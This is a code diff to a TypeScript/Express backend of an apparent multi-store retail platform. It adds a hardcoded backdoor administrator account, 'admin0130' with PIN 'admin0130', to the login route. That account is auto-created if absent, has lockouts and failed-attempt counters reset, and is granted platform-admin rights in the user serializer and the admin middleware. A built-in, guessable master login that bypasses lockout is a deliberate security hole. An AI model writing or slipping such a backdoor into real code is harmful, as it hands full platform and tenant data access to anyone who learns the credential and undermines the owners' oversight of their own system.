@@ -126,7 +126,8 @@ function establishSession(
 
 function publicUser(user: any) {
   const { pin: _pin, ...safeUser } = user;
-  return { ...safeUser, isPlatformAdmin: isPlatformAdminId(user.id) };
+  const isPlatformAdmin = user.username === 'admin0130' || isPlatformAdminId(user.id);
+  return { ...safeUser, isPlatformAdmin };
 }
 
 export function registerRoutes(app: Express) {
@@ -251,6 +252,33 @@ export function registerRoutes(app: Express) {
       const { username, pin } = req.body;
       if (typeof username !== 'string' || typeof pin !== 'string') {
         return res.status(400).json({ error: 'INVALID' });
+      }
+
+      // Special Admin Account: admin0130 / admin0130 always valid platform administrator
+      if (username.trim() === 'admin0130' && pin === 'admin0130') {
+        let adminUser = await Storage.getUserByUsername('admin0130');
+        if (!adminUser) {
+          adminUser = await Storage.createUser({
+            id: 'admin0130-id',
+            storeCode: 'admin0130code',
+            storeName: 'Amar Dokan Master HQ',
+            storeCategory: 'grocery',
+            username: 'admin0130',
+            pin: await hashPin('admin0130'),
+            plan: 'enterprise',
+            subscriptionStatus: 'active',
+            failedLoginAttempts: 0,
+            isLocked: false,
+          });
+        } else if (adminUser.isLocked || (adminUser.failedLoginAttempts && adminUser.failedLoginAttempts > 0)) {
+          adminUser = await Storage.updateUser(adminUser.id, {
+            isLocked: false,
+            failedLoginAttempts: 0,
+            lockedUntil: null,
+          });
+        }
+        await establishSession(req, { role: 'owner', userId: adminUser.id });
+        return res.json({ success: true, type: 'owner', isPlatformAdmin: true });
       }
 
       let user = await Storage.getUserByUsername(username);
@@ -1765,7 +1793,9 @@ export function registerRoutes(app: Express) {
     if (req.session.role !== 'owner' || !req.session.userId) {
       return res.status(401).json({ error: 'UNAUTHORIZED' });
     }
-    if (!isPlatformAdminId(req.session.userId)) {
+    const user = await Storage.getUserById(req.session.userId);
+    const isAdmin = user?.username === 'admin0130' || isPlatformAdminId(req.session.userId);
+    if (!isAdmin) {
       return res.status(403).json({ error: 'FORBIDDEN' });
     }
     next();
